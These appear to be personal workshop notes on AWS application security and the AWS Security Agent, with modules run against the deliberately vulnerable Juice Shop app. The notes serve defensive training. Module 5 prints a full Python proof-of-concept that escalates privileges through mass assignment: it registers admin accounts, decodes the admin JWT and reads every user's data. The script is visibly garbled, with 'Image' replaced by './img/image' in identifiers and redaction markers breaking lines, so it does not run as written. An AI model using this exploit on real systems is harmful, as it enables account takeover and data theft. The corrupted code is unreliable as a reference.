<div align='center'>

# **[AWS Security Workshop] Securing Applications in the AI Era** 

</div>

## **Security AI Strategy and Landscape**

### **Code scanning**

- Can use AIs like **Kiro**, **Claude** for pre commit hooks to scan code for vulnerabilities and security issues.

### **Cotinuous Patching**

- Patch cadance was designed for human-speed threats - it needs to operate at machine speed
- Leverage attack path analysis (autonated) for contextual threat assesment
- Automate opatch validation, deployment, and rollback, manual approval are attack windows

### **Harden the fundamentals**

- **Egress filtering**
- Deep network segmentation
- Phising-resistant MFA (hardware keys)

### **Risk Management**

### **Automated Detection & Response**

- Deploy deception capabilities such as honeytokens (cred that nobody can touch expect LLM and bait attackers) and canaries across your environment
- Move from manual SIEM review to AI-augemnted trage

## **Securing Agentic AI Application with Bedrock AgentCore**

### **Overview of Agentic AI**

AWS AI Agent Tool

**Use**
- Amazon Quick agents
- AWS Security Agent
- AWS DevOps Agent

**Builds**

- Amazon Bedrock AgentCore
- DIY 

### **Building of Agentic AI Bedrock AgentCore**

#### **Features**

- **Agent Harness** (Managed harness, strands agent SDKs, Any framwork, model, or harness)
- **Context**
- **Tools** (Gateway, Browser, Code interpreter, Payments)
- **Optimization** (Observability, Evaluation, Insights, Recommandations, A/B testing)
- **Environment** (Runrime, MicroVM)
- **Platform Control** (AWS Agent Registry, Identity, Policy, Guardrails)

#### **UI**

- Model and System prompt
- Memory
- Tools
- Skills
- Permissions
- Gateway Detail
  - Inbound Auth Configuration
    - NoAuth
    - JWT
  - Target:
    - MCP
    - Inference
    - Agent
    - Custom target

#### **OWASP Agentic AI - Threats and Mitigations**

- Memory Poisoning
- Tool Misuse
- Privilege Compomise
- Resource Overload
- Cascading Hallucination Attacks
- Intent Breaking & Goal Manipulation
- Misaligned & Deceptive Behaviours
- Repudation & Untraceabilty

#### **Other**

- Still evolvingc
- More rooms for security hackers
- Still require security controls

#### **Demo**

## **Application Security Testing with AWS Security Agent + Kiro**

Dev is so fast that security testing cannot keep up with the speed of development. Can we automate that? => **Security debt** is growing with every build

**Tradional application security testing tools:**
  
- **SAST**: See code not context
- **DAST**: Runtime only
- **SCA**: See dependencies not your code
- **Manual Penetration Testing**: Expensive, slow, and not scalable

AWS Security Agent (now part of AWS Continuum): AI Agent full-stack

**Features:**

- Proative securtity across SDLC
  - Design Review
  - Code Review
  - Penetration Testing (Hours instead of weeks)
- Context Aware autonomous Penetration Testing
  - AI-Powered Penetration Testing
  - Context-Awareness

**Pentest Architecture:**

- Multi-agent architecture powered by LLMs
  - Phase 1: Login
  - Phase 2: Scanning
  - Phase 3: Managed Exec
  - Phase 4: Guided Explore
  - Phase 5: Clean up

- Pre-flight
- Planning Agent:
    - Deploy Agentic Pentesters based on plan
- Validate Unconfirmed Findings
- Then repeat to the planning agent phase until all findings are confirmed
- Remediation Agent
  - Make pull requests to fix findings in code repos

**Testing Method:**

- **API Endpoints**: Black box
- **Creds**: Grey Box
- **Docs**: White Box
- **Code Repos**: White Box

### **Safety Challenenge**

- **Layer 1: Network Jailing & Scope Enforcement:**
- **Layer 2: Cedar Authorization Policies**
- **Layer 3: LLM Evalucation**
- **Layer 4: Content Guardrails**

### **Safety Challnenge**


### **Demo**

https://catalog.us-east-1.prod.workshops.aws/join?access-code=a417-0d188a-cf

![alt text](./img/image.png)

### **Module 1: Security Requirements**

1. Navigate to the AWS Security Agent Console .
2. Select the Agent Space.

![alt text](./img/image-1.png)

3. Select Security requirements from the navigation pane. This will load the table below. This table illustrates the fully managed security requirements pack, their enablement status, and a short description of each.

![alt text](./img/image-2.png)

![alt text](./img/image-3.png)

#### **Custom security requirements packs**

**Create Custom security requirements packs**

1. Navigate to the AWS Security Agent Console .
1. Select the Agent Space.
1. Select Security requirements from the navigation pane.
1. Choose the Custom security requirements packs tab.
1. Choose Create security requirements pack

![alt text](./img/image-4.png)

**Add Custom security requirements packs**

1. Select Security requirements from the navigation pane.
1. Choose the Custom security requirements packs tab.
1. Select the Juice Shop requirement pack.

![alt text](./img/image-5.png)

2. Choose Add manually
3. Enter the following security requirement details:

![alt text](./img/image-6.png)

![alt text](./img/image-7.png)

### **Module 2: Security design review**

#### **Create a security design review**

![alt text](./img/image-8.png)

![alt text](./img/image-9.png)

![alt text](./img/image-10.png)

![alt text](./img/image-11.png)

#### **Understanding a security design review**

![alt text](./img/image-28.png)

![alt text](./img/image-29.png)

[AWS Security Agent Security Design Report (Example)](Juice Shop initial security review-comments-2026-08-13.csv)

### **Module 3: Create threat model**

![alt text](./img/image-12.png)

![alt text](./img/image-13.png)

![alt text](./img/image-14.png)

#### **Add code to S3**

![alt text](./img/image-15.png)

s3://juiceshop-ecs-securityagentresources-oz17q80ztcfr/juice-shop-master.zip

![alt text](./img/image-16.png)

![alt text](./img/image-17.png)

![alt text](./img/image-18.png)

![alt text](./img/image-19.png)

#### **Review threat model**

![alt text](./img/image-30.png)

![alt text](./img/image-31.png)

![alt text](./img/image-32.png)

![alt text](./img/image-33.png)

[AWS Security Agent Threat Modeling Report (Example)](threat-model-report-JuiceShop-Threat-Model-1786611026761.pdf)


### **Module 4: Security code review**

![alt text](./img/image-20.png)

![alt text](./img/image-21.png)

[AWS Security Agent Code Review Report (Example)](code-review-report-JuiceShop-Code-1786676992642.pdf)

### **Module 5: Review penetration test results**

![alt text](./img/image-22.png)

![alt text](./img/image-23.png)

![alt text](./img/image-24.png)

![alt text](./img/image-25.png)

![alt text](./img/image-26.png)

Example PoC script
```python
#!/usr/bin/env python3
"""
Verification script: Vertical Privilege Escalation via Mass Assignment on User Registration
Risk Type: PRIVILEGE_ESCALATION
Target: POST /api/Users/ - 'role' field in JSON body
"""

import os
import requests
import json
import time
import base64
import uuid
import sys

# === CONFIGURATION FROM ENVIRONMENT ===
TARGET_BASE = os.environ.get("TARGET_BASE_URL")
TEST_PASSWORD: [REDACTED]"TEST_PASSWORD")

if not TARGET_BASE:
    print("ERROR: TARGET_BASE_URL environment variable must be set (e.g., http://juiceshop.dev)")
    sys.exit(1)
if not TEST_password: [REDACTED] TEST_PASSWORD environment variable must be set")
    sys.exit(1)

REG_ENDPOINT = f"{TARGET_BASE}/api/Users/"
LOGIN_ENDPOINT = f"{TARGET_BASE}/rest/user/login"
USERS_ENDPOINT = f"{TARGET_BASE}/api/Users/"
TIMEOUT = 15
UNIQUE = uuid.uuid4().hex[:8]

results = []

def log_test(name, attempted, observed, passed):
    status = "PASS" if passed else "FAIL"
    results.append(passed)
    print(f"\n[Test] {name}")
    print(f"  Attempted: {attempted}")
    print(f"  Observed:  {observed}")
    print(f"  Result:    {status}")

# --- Baseline: Register without role field to confirm default behavior ---
print("=" * 70)
print("VERIFICATION: Mass Assignment Privilege Escalation on /api/Users/")
print("=" * 70)

baseline_email = f"baseline_{UNIQUE}@verify.com"
baseline_payload = {
    "email": baseline_email,
    "password": TEST_PASSWORD,
    "passwordRepeat": TEST_PASSWORD,
    "securityQuestion": {"id": 1},
    "securityAnswer": "verify"
}

print(f"\n[Baseline] Registering user without role field: {baseline_email}")
try:
    r = requests.post(REG_ENDPOINT, json=baseline_payload, timeout=TIMEOUT)
    if r.status_code == 201:
        bdata = r.json()["data"]
        print(f"  Status: {r.status_code}, Role: {bdata['role']}, ./img/image: {bdata['profile./img/image']}")
        baseline_role = bdata["role"]
        baseline_./img/image = bdata["profile./img/image"]
    else:
        print(f"  ERROR: Registration failed with status {r.status_code}")
        print(f"  REMEDIATION = INCONCLUSIVE")
        sys.exit(1)
except Exception as e:
    print(f"  ERROR: {e}")
    print(f"  REMEDIATION = INCONCLUSIVE")
    sys.exit(1)

time.sleep(1)

# --- Test 1: Mass assignment with role=admin ---
admin_email = f"admin_{UNIQUE}@verify.com"
admin_payload = {
    "email": admin_email,
    "password": TEST_PASSWORD,
    "passwordRepeat": TEST_PASSWORD,
    "role": "admin",
    "securityQuestion": {"id": 1},
    "securityAnswer": "verify"
}

try:
    r = requests.post(REG_ENDPOINT, json=admin_payload, timeout=TIMEOUT)
    if r.status_code == 201:
        adata = r.json()["data"]
        role_accepted = adata.get("role") == "admin"
        admin_./img/image = "defaultAdmin.png" in adata.get("profile./img/image", "")
        log_test(
            "Mass Assignment: role=admin accepted on registration",
            f"POST /api/Users/ with 'role':'admin' in body",
            f"Role={adata.get('role')}, ./img/image={adata.get('profile./img/image')}",
            role_accepted and admin_./img/image
        )
    else:
        log_test(
            "Mass Assignment: role=admin accepted on registration",
            f"POST /api/Users/ with 'role':'admin' in body",
            f"Status {r.status_code}: {r.text[:100]}",
            False
        )
except Exception as e:
    log_test("Mass Assignment: role=admin", f"POST /api/Users/", f"Error: {e}", False)

time.sleep(1)

# --- Test 2: Differential - baseline role vs injected role ---
try:
    delta = (baseline_role == "customer") and role_accepted
    log_test(
        "Differential: Default role 'customer' vs injected 'admin'",
        f"Compare baseline role '{baseline_role}' with mass-assigned role",
        f"Baseline='{baseline_role}', Injected='admin', Delta={'present' if delta else 'absent'}",
        delta
    )
except Exception as e:
    log_test("Differential role check", "Compare roles", f"Error: {e}", False)

time.sleep(1)

# --- Test 3: Login with mass-assigned admin account yields admin JWT ---
try:
    r = requests.post(LOGIN_ENDPOINT, json={"email": admin_email, "password": TEST_PASSWORD}, timeout=TIMEOUT)
    if r.status_code == 200:
        token: [REDACTED]"authentication"]["token"]
        parts = token.split('.')
        payload_b64 = parts[1] + '=' * ((4 - len(parts[1]) % 4) % 4)
        jwt_data = json.loads(base64.urlsafe_b64decode(payload_b64))
        jwt_role = jwt_data["data"]["role"]
        log_test(
            "JWT token contains role=admin after login",
            f"POST /rest/user/login with mass-assigned admin credentials",
            f"JWT payload role='{jwt_role}'",
            jwt_role == "admin"
        )
    else:
        log_test("JWT token role check", "Login with admin account", f"Login failed: {r.status_code}", False)
        token: [REDACTED]
except Exception as e:
    log_test("JWT token role check", "Login", f"Error: {e}", False)
    token: [REDACTED]

time.sleep(1)

# --- Test 4: Unauthenticated access to /api/Users/ is denied ---
try:
    r = requests.get(USERS_ENDPOINT, timeout=TIMEOUT)
    denied = r.status_code == 401
    log_test(
        "Unauthenticated access to /api/Users/ is denied (confirms protection)",
        "GET /api/Users/ without Authorization header",
        f"Status={r.status_code} ({'denied' if denied else 'allowed'})",
        denied
    )
except Exception as e:
    log_test("Unauth access check", "GET /api/Users/", f"Error: {e}", False)

time.sleep(1)

# --- Test 5: Mass-assigned admin token accesses all user data ---
if token: [REDACTED]
        r = requests.get(USERS_ENDPOINT, headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        if r.status_code == 200:
            users = r.json().get("data", [])
            has_other_users = any(u.get("email") != admin_email for u in users)
            user_count = len(users)
            log_test(
                "Admin token from mass assignment accesses all user data",
                "GET /api/Users/ with escalated admin Bearer token",
                f"Status=200, Users returned={user_count}, Contains other users={has_other_users}",
                has_other_users and user_count > 5
            )
        else:
            log_test(
                "Admin token accesses user data",
                "GET /api/Users/ with admin token",
                f"Status={r.status_code}",
                False
            )
    except Exception as e:
        log_test("Admin data access", "GET /api/Users/", f"Error: {e}", False)
else:
    log_test("Admin data access", "Skipped (no token)", "Login failed earlier", False)

time.sleep(1)

# --- Test 6: Mass assignment with role=deluxe (alternate role value) ---
deluxe_email = f"deluxe_{UNIQUE}@verify.com"
deluxe_payload = {
    "email": deluxe_email,
    "password": TEST_PASSWORD,
    "passwordRepeat": TEST_PASSWORD,
    "role": "deluxe",
    "securityQuestion": {"id": 1},
    "securityAnswer": "verify"
}

try:
    r = requests.post(REG_ENDPOINT, json=deluxe_payload, timeout=TIMEOUT)
    if r.status_code == 201:
        ddata = r.json()["data"]
        deluxe_accepted = ddata.get("role") == "deluxe"
        log_test(
            "Mass Assignment: role=deluxe also accepted (confirms no filtering)",
            f"POST /api/Users/ with 'role':'deluxe' in body",
            f"Role={ddata.get('role')}",
            deluxe_accepted
        )
    else:
        log_test(
            "Mass Assignment: role=deluxe",
            f"POST /api/Users/ with 'role':'deluxe'",
            f"Status {r.status_code}",
            False
        )
except Exception as e:
    log_test("Mass Assignment: role=deluxe", "POST /api/Users/", f"Error: {e}", False)

# === SUMMARY ===
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)
passed = sum(1 for r in results if r)
failed = sum(1 for r in results if not r)
total = len(results)
print(f"Tests run: {total} | Passed: {passed} | Failed: {failed}")
print(f"Success rate: {passed}/{total}")

if failed == 0 and total > 0:
    print("\nAll tests confirm mass assignment of 'role' field enables privilege escalation.")
    print("REMEDIATION = NOT_REMEDIATED")
elif passed == 0:
    print("\nNo tests passed - vulnerability may be remediated or environment issue.")
    print("REMEDIATION = REMEDIATED")
else:
    print("\nPartial results - some tests passed indicating vulnerability may still exist.")
    print("REMEDIATION = NOT_REMEDIATED")
```

![alt text](./img/image-27.png)

[AWS Security Agent Penetration Testing Report (Example)](pentest-report-JuiceShop-Builder-Session-Pentest-1786609435459.pdf)

## **The AWS AI Security Framework**
****